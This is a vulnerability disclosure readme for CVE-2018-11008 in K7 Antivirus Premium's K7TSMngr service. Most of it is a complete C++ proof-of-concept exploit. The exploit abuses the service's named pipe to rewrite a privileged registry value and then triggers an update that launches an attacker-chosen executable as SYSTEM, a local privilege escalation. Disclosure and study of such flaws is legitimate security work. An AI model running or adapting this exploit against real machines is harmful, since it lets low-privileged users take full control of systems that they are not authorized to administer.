# CVE-2018-11008

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x1003E, the handler provies a way to set arbitary registry values using the RSET command. In the PoC, I use this to reset the  DirProductBase to a path of the user's choosing and then kick off an update. This will use the value in DirProductBase and look for K7TSMngr.exe and if found will launch it. From here is simple to LPE. Again this can be accessed from LOW and this makes it trivial to get a SYSTEM process launched. 

The PoC code concept is similar to CVE-2018-9332 where it simply modifies the DirProductBase and launches an update to illustrate the LPE.

# PoC Code
```C++
#include <Windows.h>
#include <stdio.h>

/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

//
// Vulnerability
//		Type:
//			Logical Flaw
//
//		Description:
//			Privileged registry modification via a SYSTEM process (effectively a broker)
void Vuln_LogicFlaw_RegSetValue(PSTR pszFolder)
{
	//
	// Craft the data for 'RSET' so we can modify an arbitary registry key. As before, we are just 
	// going to modify the DirProductBase and kick off an update as it demonstrates the point.
	// But from here YOU CAN WRITE TO MOST PLACES from a SYSTEM process which is bad
	//
	DWORD dwAction = 0x52534554;

	PVOID pData = AllocPrecise(0x1000);
	memcpy(pData, &dwAction, 4);
	PSTR pszReg = (PSTR)pData;
	pszReg += 4;
	PSTR pszTarget = "HKLM\\SOFTWARE\\K7 Computing\\K7TotalSecurity\\DirProductBase";
	strcat(pszReg, pszTarget);
	pszReg += strlen(pszTarget) + 1;

	PSTR pszValue = pszFolder;
	strcat(pszReg, pszValue);
	pszReg += strlen(pszValue) + 1;

	PDWORD pdwValue = (PDWORD)pszReg;
	*pdwValue = 1;
	pszReg += 4;

    //
    // This will set the appropiate registry key via the service
	//
    if (!CallPipeFunction(0x1003E, (PBYTE)pData, 0x1000, NULL, 0))
	{
		printf("Error: CallPipeFunction failed");
		return;
	}

	//
	// This kicks off an update process and will run any binary called K7TSHlpr.exe from the folder 
	// in DirProductBase. Therefore we have just created a process with SYSTEM integrity in Session
	// 0. Fab :)
	//
	InitPipe();
	BYTE data[0x10] = { 0 };
	if (!CallPipeFunction(0x10010, data, sizeof(data), NULL, 0))
	{
		printf("Error: Kicking off an update failed\r\n");
	}
}

int main(int argc, char** argv)
{
	if (argc != 2)
	{
		printf("Usage: <Folder>\r\n");
		printf("\tFolder: If K7TSHlr.exe is in this folder, then it will be launched as SYSTEM");
		return -1;
	}

	Vuln_LogicFlaw_RegSetValue(argv[1]);
}

```